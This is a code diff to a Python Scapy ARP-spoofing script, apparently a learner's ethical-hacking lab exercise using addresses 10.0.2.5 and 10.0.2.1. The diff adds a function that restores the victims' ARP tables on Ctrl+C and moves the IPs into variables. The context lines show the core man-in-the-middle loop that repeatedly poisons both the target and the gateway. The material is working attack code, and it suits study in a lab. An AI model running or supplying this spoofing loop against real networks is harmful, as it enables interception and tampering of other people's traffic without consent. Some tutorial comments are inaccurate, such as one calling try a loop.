@@ -30,12 +30,27 @@ def spoof(target_ip, spoof_ip):
     # the false verbose option means you stop getting the message about packets being sent each time
 
 
+def restore(destination_ip, source_ip):
+    # this function will restore the arp tables of the machines we are spoofing back to normal
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    # we use hwsrc in this command else scapy will automatically use our mac as the source, so effectively
+    # we would just be spoofing again. op=2 means an arp response.
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "10.0.2.5"
+gateway_ip = "10.0.2.1"
+
 try:
     # try is a type of loop
     while True:
-        spoof("10.0.2.5", "10.0.2.1")
+        spoof(target_ip, gateway_ip)
         # spoofs the client
-        spoof("10.0.2.1", "10.0.2.5")
+        spoof(gateway_ip, target_ip)
         # spoofs the router
         sent_packet_count = sent_packet_count + 2
         print("\r[+] Packets sent:" + str(sent_packet_count)),
@@ -50,5 +65,8 @@ try:
         time.sleep(2)
 except KeyboardInterrupt:
     # KeyboardInterrupt is the exception shown if you quit normally.
-    print("[+] Detected CTRL + C .....quitting")
+    print("\n[+] Detected CTRL + C .....resetting ARP tables on target devices\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+
 
